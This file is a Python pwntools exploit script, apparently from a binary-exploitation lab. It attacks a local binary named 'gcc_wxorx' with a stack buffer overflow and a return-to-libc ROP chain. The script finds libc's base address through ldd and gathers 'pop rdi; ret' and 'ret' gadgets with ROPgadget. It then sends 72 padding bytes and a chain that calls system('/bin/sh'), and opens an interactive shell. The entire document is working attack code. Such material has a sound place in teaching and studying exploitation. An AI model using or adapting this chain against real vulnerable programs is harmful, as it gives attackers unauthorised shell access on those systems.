# 64-bit
from pwn import *
import subprocess
import re

# match libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff7da4000)
libc_regex = re.compile(r'libc.so.6 => (.*) \(0x(.*)\)')
poprdi_regex = re.compile(r'0x([0-9a-fA-F]+) : pop rdi ; ret')
ret_regex = re.compile(r'0x([0-9a-fA-F]+) : ret')

BINARY = './bin/gcc_wxorx'

elf = context.binary = ELF(BINARY)
p = process()

libc = elf.libc
parse = subprocess.run(['ldd', BINARY], capture_output=True, text=True)
libc.address = int(re.search(libc_regex, parse.stdout).group(2), 16)

system = libc.sym['system']
binsh = next(libc.search(b'/bin/sh'))
ropgadget = subprocess.Popen(['ROPgadget', '--binary', BINARY], stdout=subprocess.PIPE)
grep = subprocess.check_output(['grep', ': pop rdi ; ret'], stdin=ropgadget.stdout).decode()
ropgadget.wait()
POP_RDI = int(re.search(poprdi_regex, grep).group(1), 16)

ropgadget = subprocess.Popen(['ROPgadget', '--binary', BINARY], stdout=subprocess.PIPE)
grep = subprocess.check_output(['grep', ': ret'], stdin=ropgadget.stdout).decode()
ropgadget.wait()
RET = int(re.search(ret_regex, grep).group(1), 16)

payload = b'A' * 72
payload += p64(POP_RDI)
payload += p64(binsh)
payload += p64(RET)
payload += p64(system)
payload += p64(0x0)

p.clean()
p.sendline(payload)
p.interactive()
